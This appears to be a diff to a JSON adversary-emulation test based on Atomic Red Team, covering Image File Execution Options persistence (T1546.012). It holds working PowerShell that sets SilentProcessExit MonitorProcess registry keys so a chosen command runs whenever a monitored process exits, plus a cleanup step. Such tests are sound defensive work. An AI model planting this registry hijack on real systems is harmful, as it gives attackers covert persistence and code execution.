@@ -7,52 +7,52 @@
   ],
   "steps": [
     {
-      "id": "57b24875-8de5-42c2-87b1-b75d68e8f698",
+      "id": "086282d8-de80-46c6-9df1-a6817fac3a08",
       "type": "execute-command",
       "data": {
         "command": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "39083be9-f39c-4d88-a529-157bfacafed4",
+      "id": "96fe5f5b-bde9-45f4-b931-16b38388f348",
       "type": "execute-command",
       "data": {
         "command": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nRemove-Item $registryPath -force\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "57b24875-8de5-42c2-87b1-b75d68e8f698",
+      "s": "086282d8-de80-46c6-9df1-a6817fac3a08",
       "p": "on-success",
-      "o": "39083be9-f39c-4d88-a529-157bfacafed4"
+      "o": "96fe5f5b-bde9-45f4-b931-16b38388f348"
     },
     {
-      "s": "57b24875-8de5-42c2-87b1-b75d68e8f698",
+      "s": "086282d8-de80-46c6-9df1-a6817fac3a08",
       "p": "on-failure",
-      "o": "39083be9-f39c-4d88-a529-157bfacafed4"
+      "o": "96fe5f5b-bde9-45f4-b931-16b38388f348"
     }
   ],
   "tags": [
-    "T1546.012",
-    "atomic-red-team"
+    "T1546",
+    "T1546.012"
   ],
   "input_arguments": [
-    {
-      "name": "process",
-      "type": "string",
-      "description": "Process to monitor\n",
-      "value": "whoami.exe"
-    },
     {
       "name": "cmd_to_run",
       "type": "string",
       "description": "Command to execute\n",
       "value": "cmd.exe /c calc.exe"
+    },
+    {
+      "name": "process",
+      "type": "string",
+      "description": "Process to monitor\n",
+      "value": "whoami.exe"
     }
   ]
 }
